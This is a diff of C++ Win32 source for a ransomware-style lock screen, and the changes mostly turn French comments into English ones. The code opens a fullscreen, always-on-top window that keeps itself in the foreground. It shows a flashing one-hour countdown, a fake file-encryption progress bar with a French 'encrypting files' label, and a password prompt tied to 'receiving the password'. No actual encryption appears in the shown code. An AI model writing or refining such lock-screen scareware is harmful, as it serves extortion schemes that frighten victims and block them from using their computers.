@@ -14,7 +14,7 @@ HWND hWndProgressBar;
 HWND hWndTimerLabel;
 HWND hwndMain;
 HFONT hFontBold;
-HWND hWndEncryptionStatusLabel; // Nouveau label de statut de chiffrement
+HWND hWndEncryptionStatusLabel; // Encryption Status Label
 std::wstring correctPassword;
 
 // Timer variables
@@ -31,7 +31,7 @@ const wchar_t* labelTexts[8] = {
     L"to receive the password"
 };
 
-static bool isRed = true;
+static bool isRed = true; // To alternate text color
 int fakeProgress = 0;
 
 void SimulateFakeProgress() {
@@ -43,12 +43,12 @@ void SimulateFakeProgress() {
     }
     if (delayCounter > 0) {
         delayCounter--;
-        return; // Pause momentanée
+        return; // wait cycle
     }
 
-    int step = rand() % 2; // avance de 0 à 2 %
+    int step = rand() % 2; // advance randomly by 0-2 %
     if (step == 0) {
-        delayCounter = rand() % 25; // pause de 0 à 25 cycles ()
+        delayCounter = rand() % 25; // pause for some cycles
     }
     else {
         fakeProgress += step;
@@ -68,12 +68,11 @@ void KeepWindowActive()
 
 // Function to update the progress bar
 void UpdateProgressBar(){
-    int progressValue = (3600 - remainingTime) * 100 / 3600; // Calcul du pourcentage
+    int progressValue = (3600 - remainingTime) * 100 / 3600; 
     //SendMessage(hWndProgressBar, PBM_SETPOS, progressValue, 0);
-    isRed = !isRed;
-    InvalidateRect(hwndMain, NULL, TRUE);
+	isRed = !isRed; // Alternate text color 
+	InvalidateRect(hwndMain, NULL, TRUE); // Redraw the window
 
-    // Calcul des heures, minutes et secondes restantes
     int hours = remainingTime / 3600;
     int minutes = (remainingTime % 3600) / 60;
     int seconds = remainingTime % 60;
@@ -91,16 +90,16 @@ void UpdateProgressBar(){
     }
 
     remainingTime--;
-    KeepWindowActive(); // Garder la fenêtre au premier plan
+    KeepWindowActive(); 
 }
-
-// Timer callback function
+ 
+// Timer callback function (called by system every interval)
 void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
 {
     UpdateProgressBar();
 }
 
-// Window Procedure
+// Handles windows messages
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
     switch (uMsg)
@@ -119,7 +118,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         RECT rc;
         GetClientRect(hwnd, &rc);
         FillRect(hdc, &rc, hbrBkgnd);
-        return 1;
+        return 1; // Erase Background
     }
 
     case WM_CTLCOLORSTATIC:
@@ -127,7 +126,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         HDC hdcStatic = (HDC)wParam;
         SetTextColor(hdcStatic, isRed ? RGB(255, 0, 0) : RGB(255, 255, 255));
         SetBkMode(hdcStatic, TRANSPARENT);
-        return (LRESULT)GetStockObject(NULL_BRUSH);
+        return (LRESULT)GetStockObject(NULL_BRUSH); // Set text color
     }
 
     case WM_COMMAND:
@@ -150,10 +149,10 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
     case WM_TIMER:
         if (wParam == 1) {
-            UpdateProgressBar(); // compte à rebours
+            UpdateProgressBar();
         }
         else if (wParam == 2) {
-            SimulateFakeProgress(); // fausse barre de chiffrement
+            SimulateFakeProgress(); 
         }
         break;
 
@@ -171,20 +170,23 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 // Create the GUI
 void ShowGUI()
 {
+	// Initialize common controls (for progress bar)
     INITCOMMONCONTROLSEX icex;
     icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
     icex.dwICC = ICC_PROGRESS_CLASS;
     InitCommonControlsEx(&icex);
-
+	// Screen dimensions
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
+	// Background color
     hbrBkgnd = CreateSolidBrush(RGB(0, 0, 0));
 
     hFontBold = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
         DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
         VARIABLE_PITCH, L"Arial");
-
+    
+	// Define the window class 
     const wchar_t CLASS_NAME[] = L"MyDLLWindowClass";
     WNDCLASS wc = { };
     wc.lpfnWndProc = WindowProc;
@@ -193,14 +195,17 @@ void ShowGUI()
     wc.hbrBackground = (HBRUSH)GetStockObject(NULL_BRUSH);
     RegisterClass(&wc);
 
+	// Create the window
     hwndMain = CreateWindowEx(WS_EX_TOPMOST, CLASS_NAME, L"My DLL GUI",
         WS_POPUP | WS_VISIBLE, 0, 0, screenWidth, screenHeight,
         NULL, NULL, GetModuleHandle(NULL), NULL);
 
     if (hwndMain == NULL) return;
 
+	// Y-offset for GUI elements
     int yOffset = screenHeight / 10;
 
+	// Create labels 
     for (int i = 0; i < 8; i++)
     {
         hWndLabels[i] = CreateWindow(L"STATIC", labelTexts[i], WS_VISIBLE | WS_CHILD,
@@ -208,18 +213,19 @@ void ShowGUI()
         SendMessage(hWndLabels[i], WM_SETFONT, (WPARAM)hFontBold, TRUE);
         yOffset += 50;
     }
-
+	// Create the timer label
     hWndTimerLabel = CreateWindow(L"STATIC", L"You have one hour", WS_VISIBLE | WS_CHILD | SS_CENTER,
         screenWidth / 2 - 150, yOffset, 300,120, hwndMain, NULL, GetModuleHandle(NULL), NULL);
     SendMessage(hWndTimerLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
     yOffset += 75;
 
+	// Create the encryption status label
     hWndEncryptionStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
         screenWidth / 2 - 200, yOffset, 400, 60, hwndMain, NULL, GetModuleHandle(NULL), NULL);
     SendMessage(hWndEncryptionStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
     yOffset += 50;
 
-
+	// Create the progress bar
     hWndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
         WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
         screenWidth / 4, yOffset + 25, screenWidth / 2, 30,
@@ -229,18 +235,24 @@ void ShowGUI()
     SendMessage(hWndProgressBar, PBM_SETPOS, 0, 0);
     yOffset += 60;
 
+	// Create the input field
     hWndInput = CreateWindow(L"EDIT", L"", WS_TABSTOP | WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD | ES_AUTOHSCROLL,
         screenWidth / 4, yOffset, screenWidth / 2, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);
 
+	// Create the Enter button
     HWND hWndEnter = CreateWindow(L"BUTTON", L"Enter", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
         screenWidth / 2 - 50, yOffset + 50, 100, 50, hwndMain, (HMENU)1, GetModuleHandle(NULL), NULL);
-
+    
+	// Set two timers:
+	// 1. General timer
+	// 2. Fake progress timer (shorter interval)
     timerID = SetTimer(hwndMain, 1, 1000, NULL);
     timerID = SetTimer(hwndMain, 2, 200, NULL);
 
     ShowWindow(hwndMain, SW_SHOW);
     UpdateWindow(hwndMain);
 
+	// Event loop
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))
     {
